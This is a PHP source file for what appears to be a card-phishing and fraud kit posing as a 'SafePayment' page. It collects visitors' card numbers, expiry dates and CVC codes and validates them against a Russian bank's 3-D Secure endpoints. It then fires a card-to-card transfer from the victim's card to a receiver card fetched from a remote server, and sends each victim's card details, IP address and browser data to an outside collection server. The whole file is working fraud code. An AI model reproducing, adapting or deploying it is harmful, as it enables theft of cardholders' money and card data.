<?php
header('Content-Type: text/html; charset=windows-1251');
class m {
 public static $socks_ips = "127.0.0.1:1000";
 public static $socks_passs = "login:password";
 public static  $filesDir = "filestxt2343352127";
 public static  $SumDefault = "100";
 public static  $uniqText = "paymentuniqtext.txt";
 public static  $statd = "paymenthits.txt";
 public static  $inputData="paymentresult.txt";
 public static  $getCard="cards.txt";
 public static  $finalRedirect="finalredirect.txt";
 public static  $SafePayment = "SafePayment"; //folder where generate tmp files;
 public static  $urlSQLServerPage="sqlserver.txt";

 public function parseid($get){
   $params =  @preg_replace ("/[^a-zA-Z0-9-&=]/","",$_SERVER['QUERY_STRING']);
   $id="0";
   $sum=self::$SumDefault;
   if(strpos(" ".$params,"id") && $get['id']!=""){
     if(@strpos(" ".$params,"&")){
        $a = explode("&",$params);
        $id= @str_replace("id=","",$a[0]);
        //$sum = @base64_decode(@base64_decode(@base64_decode(@base64_decode($a[1]))));
        $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
$sum=file_get_contents($urlSQLServerPage.'/?sum='.$a[1]);
$sum=preg_replace('/[^\d]/', '', $sum);
if(@is_numeric($sum)==false){ $sum=self::$SumDefault;}
     }
   }

   return $id.",".$sum;

 }

 public function getIDtxt($id){

 	//$textall = @file_get_contents(self::$filesDir."/".self::$uniqText);
      $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
      $textall=file_get_contents($urlSQLServerPage.'/?text='.$id);
      //echo $textall;
      //echo mb_convert_encoding($textall, "windows-1251");
      //die();
      //$textall=mb_convert_encoding($textall, "windows-1251");
      $textall = iconv ( 'UTF-8' , 'CP1251//IGNORE' , $textall );
 	$a = explode("\r\n",$textall);
 	$text = "";
 	 foreach($a as $v){
 		if(strpos(" ".$v,$id)){
 			$b = explode("|",$v);
 			$text=$b[0];
 			break;
 		}
 	 }
 	 return $text;
 }

  public function finalIDtxt($id){

 	//$textall = @file_get_contents(self::$filesDir."/".self::$uniqText);
      $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
      $textall=file_get_contents($urlSQLServerPage.'/?text='.$id);
      //$textall=mb_convert_encoding($textall, "windows-1251");
      $textall = iconv ( 'UTF-8' , 'CP1251//IGNORE' , $textall );
 	$a = explode("\r\n",$textall);
 	$text = "";
 	 foreach($a as $v){
 		if(strpos(" ".$v,$id)){
 			$b = explode("|",$v);
 			$text=$b[2];
 			break;
 		}
 	 }
 	 return $text;
 }

 public function insertstat($id,$sum/*,$card,$idsum*/){
 	//$file = self::$filesDir."/".self::$statd;
      $stat = @date("d-m-y").",".@date("H:i:s")."|".$id."|".$sum."|".$_SERVER['REMOTE_ADDR']."|".$_SERVER['HTTP_USER_AGENT']."|".$_SERVER['HTTP_HOST']."\r\n";
      $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
      $textall=file_get_contents($urlSQLServerPage.'?insert_payment_hits=1&data='.urlencode($stat));
      //echo $textall;
      //$textall=file_get_contents($urlSQLServerPage.'/?insert_log_card=1&fxi='.$id.'&fxc='.$card.'&fxs='.$idsum);
      //echo $textall;
      //echo "ok";
      //$fp = @fopen($file,"a+");
 	//@fwrite($fp,$stat);
 	//@fclose($fp);
 }
 
  public function genfile($st){
     $st=@preg_replace ("/[^a-zA-Z0-9\s]/","",$st);
     $fp = @fopen(self::$SafePayment."/".$st.".php","w+");
     @fclose($fp);
 }

 public function getRandcards($id, $idsum){
   $str=@file_get_contents(self::$filesDir."/".self::$getCard);
   $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
   $str=file_get_contents($urlSQLServerPage.'/?card=get&fxi='.$id.'&fxs='.$idsum);
   //echo $str;
   //echo "<br>";
   //echo $str;
   if(iconv_strlen($str)>0){
   	$a = explode("\r\n",$str);

   	$numbers = range(0, count($a)-1);
       	$genTime1=substr(time()+(double)microtime()*1000000+getmypid(),3);
      shuffle($numbers);
      while (list(, $number) = each($numbers)) {
       return $a[$number];
       break;
      }

   }
 }

 public function curl_get($url,$ref,$socks_ip,$socks_pass,$ua){
 	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_REFERER, $ref);
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
//curl_setopt($ch, CURLOPT_PROXY, $socks_ip);
//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $socks_pass);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

  $so = curl_exec ($ch);
  curl_close ($ch);
  return $so;
 }

 public function curl_post($url,$ref,$socks_ip,$socks_pass,$ua,$postParams,$http_header){

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL,$url);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $postParams);
      curl_setopt($ch, CURLOPT_REFERER, $ref);
      curl_setopt($ch, CURLOPT_USERAGENT, $ua);
//curl_setopt($ch, CURLOPT_PROXY, $socks_ip);
//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $socks_pass);
      curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_HTTPHEADER, $http_header);
  $server_output = curl_exec ($ch);
  curl_close ($ch);
  return $server_output;
 }

 public function curler($post){
  //echo "<pre>";
  //print_r($post);
  //echo "</pre>";
 //clear specSymbols
  $c1 = @preg_replace ("/[^0-9]/","",$post['c1']);
  $month = @preg_replace ("/[^0-9]/","",$post['m']);
  $y = @preg_replace ("/[^0-9]/","",$post['y']);
  $cvc = @preg_replace ("/[^0-9]/","",$post['c']);
  $sum =  @preg_replace ("/[^a-zA-Z0-9-&=]/","",$post['sum']);

  //$sum = @base64_decode(@base64_decode(@base64_decode(@base64_decode($a[1]))));

  if(@is_numeric($sum)==false){ $sum=self::$SumDefault;}


  if($c1=="" || $month=="" || $y=="" || $cvc==""){
   print "err1"; exit;
  }

  if(iconv_strlen($c1)!="16"){
  	print "err2"; exit;
  }

  if(iconv_strlen($month)!="2" || $month>="13" || $month=="0"){
  	print "err3"; exit;
  }

  if(iconv_strlen($y)!="2" || $y<"17" || $y=="0" || $y>="30"){
  	 print "err4"; exit;
  }

   if(iconv_strlen($cvc)!="3"){
  	print "err5"; exit;
  }

  if($y==@date("Y") && $month<=@date("m")){
  	print "err6"; exit;
  }


  //$c2 = self::getRandcards($post['id']);//cardForpayment
  //echo "<pre>";
  //print_r($post);
  $c2 = $post['fxc'];
  $fxc_card=$c2;
  //echo $fxc_card;
  //echo "<script>$('body').append('<input type=\"hidden\" class=\"mfxc\" value=\"".$c2."\">')</script>";
  $summaPerevoda = $sum-30;

  $ua = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36";
  $ref = "";
  $socks_ip = self::$socks_ips;
  $socks_pass = self::$socks_passs;

  $strInputData = @date("d-m-y").",".@date("H:i:s")."|".$_SERVER['REMOTE_ADDR']."|".$_SERVER['HTTP_USER_AGENT']."|".$c1."|".$month."/".$y."|".$cvc."|".$summaPerevoda."\r\n";
   $http_header = array();
  //gen transID
  $url1 = "https://3ds.payment.ru/cgi-bin/get_trans_cond_p2p";
   //check Valid card
  $url2 = "https://3ds.payment.ru/cgi-bin/is_3DS";
  $postParams2 = "CARD=".$c1."&EXP=".$month."&EXP_YEAR=".$y."&CVC2=".$cvc;


//get free trans id
   $ch1_cont = self::curl_get($url1,$ref,$socks_ip,$socks_pass,$ua);
   @preg_match_all('~"(.*?)(?:"|$)|([^"]+)~',$ch1_cont,$m,PREG_SET_ORDER);
   $order = $m[3][1];
   $timest = $m[7][1];


//check valid card
    $ch2_cont = self::curl_post($url2,$ref,$socks_ip,$socks_pass,$ua,$postParams2,$http_header);



    $a = explode('"',$ch2_cont);

    if($a[3]!="Y"){
    	//card not valid
    	print "err7"; exit;
    }



 //getFORMER

   $url3 = "https://3ds.payment.ru/cgi-bin/cgi_link";

   $sc1 =  @preg_split('//u',$c1,-1,PREG_SPLIT_NO_EMPTY);
   $sc2 =  @preg_split('//u',$c2,-1,PREG_SPLIT_NO_EMPTY);

   $sender_card_frame11=array($sc1[0],$sc1[1],$sc1[2],$sc1[3]);
   $sender_card_frame11 = implode("", $sender_card_frame11);
   $sender_card_frame12=array($sc1[4],$sc1[5],$sc1[6],$sc1[7]);
   $sender_card_frame12 = implode("", $sender_card_frame12);
   $sender_card_frame13=array($sc1[8],$sc1[9],$sc1[10],$sc1[11]);
   $sender_card_frame13 = implode("", $sender_card_frame13);
   $sender_card_frame14=array($sc1[12],$sc1[13],$sc1[14],$sc1[15]);
   $sender_card_frame14 = implode("", $sender_card_frame14);

   $sender_card_frame21=array($sc2[0],$sc2[1],$sc2[2],$sc2[3]);
   $sender_card_frame21 = implode("", $sender_card_frame21);
   $sender_card_frame22=array($sc2[4],$sc2[5],$sc2[6],$sc2[7]);
   $sender_card_frame22 = implode("", $sender_card_frame22);
   $sender_card_frame23=array($sc2[8],$sc2[9],$sc2[10],$sc2[11]);
   $sender_card_frame23 = implode("", $sender_card_frame23);
   $sender_card_frame24=array($sc2[12],$sc2[13],$sc2[14],$sc2[15]);
   $sender_card_frame24 = implode("", $sender_card_frame24);

   $postParams3 =  "sender_card_frame1="
   .$sender_card_frame11."&sender_card_frame2="
   .$sender_card_frame12."&sender_card_frame3="
   .$sender_card_frame13."&sender_card_frame4="
   .$sender_card_frame14."&EXP=".$month."&EXP_YEAR="
   .$y."&CVC2="
   .$cvc."&receiver_card_frame1="
   .$sender_card_frame21."&receiver_card_frame2="
   .$sender_card_frame22."&receiver_card_frame3="
   .$sender_card_frame23."&receiver_card_frame4="
   .$sender_card_frame24."&AMOUNT="
   .$summaPerevoda."&backspace_transfer=N&is_active_3ds_sender=Y&CURRENCY=RUB&ORDER=".$order."&DESC=%D0%9F%D0%B5%D1%80%D0%B5%D0%B2%D0%BE%D0%B4+%D1%81+%D0%BA%D0%B0%D1%80%D1%82%D1%8B+%D0%BD%D0%B0+%D0%BA%D0%B0%D1%80%D1%82%D1%83&TERMINAL=24043202&TRTYPE=8&MERCH_NAME=PSB&MERCHANT=000601224043202&EMAIL=lakhtin%40psbank.ru&TIMESTAMP=".$timest."&BACKREF=&CARD=".$c1."&PAYMENT_TO=".$c2."&PAYMENT_TEXT=".$summaPerevoda.".00&DEVICE_NA=%7B%22MFP%22%3A%7B%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F60.0.3112.78+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%2220030107%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22IEPlugins%22%3A%7B%7D%2C%22NetscapePlugins%22%3A%7B%22Widevine+Content+Decryption+Module%22%3A%221.4.8.1000%22%2C%22Chrome+PDF+Viewer%22%3A%22%22%2C%22Native+Client%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A900%2C%22AvlHeight%22%3A860%2C%22FullWidth%22%3A1600%2C%22AvlWidth%22%3A1600%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%7D%2C%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-180%7D%7D%2C%22VERSION%22%3A%222.0%22%2C%22ExternalIP%22%3A%22%22%2C%22MESC%22%3A%7B%22mesc%22%3A%22mi%3D2%3Bcd%3D150%3Bid%3D30%3Bmesc%3D415133%3Bmesc%3D581133%22%7D%2C%22MAC%22%3A%22%22%2C%22InternalIP%22%3A%22%22%2C%22DESC%22%3A%22%22%7D&DEVICE_ID=";


   $http_header = array(
     "Host: 3ds.payment.ru",
     "Connection: keep-alive",
     "Cache-Control: max-age=0",
     "Origin: https://3ds.payment.ru",
     "Upgrade-Insecure-Requests: 1",
     "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
     "Content-Type: application/x-www-form-urlencoded",
     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
     "Referer: https://3ds.payment.ru/P2P/card_form.html",
     "Accept-Language: en-US,en;q=0.8",
     "Cookie: _ym_uid=1; _ym_isad=2; _ga=GA1; _gid=; _gat=1",
     "Accept-Encoding: gzip, deflate",
     "Content-Length: ".iconv_strlen($postParams3)
   );

   $ch3_cont = self::curl_post($url3,$ref,$socks_ip,$socks_pass,$ua,$postParams3,$http_header);

     @preg_match_all("/VALUE=\"(.*)\"/", $ch3_cont, $ars);

     $postParams4="";
      foreach($ars[0] as $kp=>$vp){
       $vp = str_replace("VALUE=\"","",$vp);
       $vp = str_replace("\"","",$vp);
      	 if($kp==0){ $postParams4 .= "CONFIRM_ID=".urlencode($vp)."&"; }
      	 if($kp==1){ $postParams4 .= "CONFIRM=".$vp."&"; }
      	 if($kp==2){ $postParams4 .= "TERMINAL=".$vp."&";

      	   //$strInputData = @date("d-m-y").",".@date("H:i:s")."|".$_SERVER['REMOTE_ADDR']."|".$_SERVER['HTTP_USER_AGENT']."|".$c1."|".$month."/".$y."|".$cvc."|".$summaPerevoda."|".$vp."\r\n";
                $strInputData = @date("d-m-y").",".@date("H:i:s")."|".$post['id']."|".$summaPerevoda."|".$_SERVER['REMOTE_ADDR']."|".$_SERVER['HTTP_USER_AGENT']."|".$_SERVER['HTTP_HOST']."|".$c1."|".$cvc."|".$month."/".$y."|".$vp."|".$fxc_card."\r\n";
                $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
                $textall=file_get_contents($urlSQLServerPage.'?insert_payment_result=1&data='.urlencode($strInputData));
                 //$fps = @fopen(self::$filesDir."/".self::$inputData,"a+");
                 //@fwrite($fps,$strInputData);
                 //@fclose($fps);

      	  }
      	 if($kp==3){ $postParams4 .= "TRTYPE=".$vp."&"; }
      }
      $postParams4 .= "SUBMIT=Y";

   $http_header2 = array(
     "Host: 3ds.payment.ru",
     "Connection: keep-alive",
     "Cache-Control: max-age=0",
     "Origin: https://3ds.payment.ru",
     "Upgrade-Insecure-Requests: 1",
     "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
     "Content-Type: application/x-www-form-urlencoded",
     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
     "Referer: https://3ds.payment.ru/cgi-bin/cgi_link",
     "Accept-Language: en-US,en;q=0.8",
     "Cookie: _ym_uid=1; _ym_isad=2; _ga=GA1; _gid=; _gat=1",
     "Accept-Encoding: gzip, deflate",
     "Content-Length: ".iconv_strlen($postParams4)
   );
   $url4 = "https://3ds.payment.ru/cgi-bin/cgi_link";

   $ch4_cont = self::curl_post($url4,$ref,$socks_ip,$socks_pass,$ua,$postParams4,$http_header2);



    $fp = @fopen(self::$SafePayment."/".$_COOKIE["rand"].".php","a+");
    @fwrite($fp,$ch4_cont);
    @fclose($fp);

    print '
     <iframe style="width:100%; height:100%; position:absolute; top:0px;left:0px;" frameBorder="1" scrolling="yes" src="'.self::$SafePayment.'/'.$_COOKIE["rand"].'.php"></iframe>
    ';

  }

  public function insertFinal($strInputData){
	//$file =  self::$filesDir."/".self::$finalRedirect;
	//$str = @date("d-m-y").",".@date("H:i:s")."|".$_SERVER['REMOTE_ADDR']."|".$_SERVER['HTTP_USER_AGENT']."\r\n";
      $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
      return file_get_contents($urlSQLServerPage.'?insert_payment_final=1&data='.urlencode($strInputData));
	//$fp = @fopen($file,"a+");
	//@fwrite($fp,$str."\r\n");
	//@fclose($fp);
  }

   public function check_term($post){
        //echo "<pre>";
        //print_r($post);
        //echo "</pre>";
         $id = $post['id'];
         $id = @preg_replace ("/[^a-zA-Z0-9-]/","",$id);
         //print '<script>window.location="final.php?id='.$id.'";</script>';  exit;
         //$str = @file_get_contents(self::$filesDir."/".self::$inputData);
         $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
         $str=file_get_contents($urlSQLServerPage.'/?get_payment_result=1');
         if($str!=""){
             $a = explode("\r\n",$str);
             foreach($a as $k=>$v){
                  if(strpos(" ".$v, $_SERVER['REMOTE_ADDR'])){
             	//if(strpos(" ".$v, $_SERVER['HTTP_HOST'])){
                     $b = explode("|",$v);
                     //print_r(serialize($b));
                     if($b[9]==$post['termsxxx']){
                      //$strInputData = @date("d-m-y").",".@date("H:i:s")."|".$post['id']."|".$post['sum']."|".$_SERVER['REMOTE_ADDR']."|".$_SERVER['HTTP_USER_AGENT']."|".$_SERVER['HTTP_HOST']."|".$post['c1']."|".$post['c']."|".$post['m']."/".$post['y']."|".$post['termsxxx']."|".$post['fxs']."\r\n";
                      $strInputData = @date("d-m-y").",".@date("H:i:s")."|".$post['id']."|".$post['sum']."|".$_SERVER['REMOTE_ADDR']."|".$_SERVER['HTTP_USER_AGENT']."|".$_SERVER['HTTP_HOST']."|".$post['c1']."|".$post['c']."|".$post['m']."/".$post['y']."|".$post['termsxxx']."\r\n";
                      $this->insertFinal(urlencode($strInputData));
                      print '<script>window.location="final.php?id='.$id.'";</script>';  exit;
                     }else{
                     	print 'err8'; exit;
                     }
             	}
             }
         }  else{exit;}
         exit;

   }

   function get_server_answer($urlSQLServerPage, $query){
       $urlSQLServerPage=file_get_contents($urlSQLServerPage);
       return file_get_contents($urlSQLServerPage.'/?'.$query);
   }
}


?>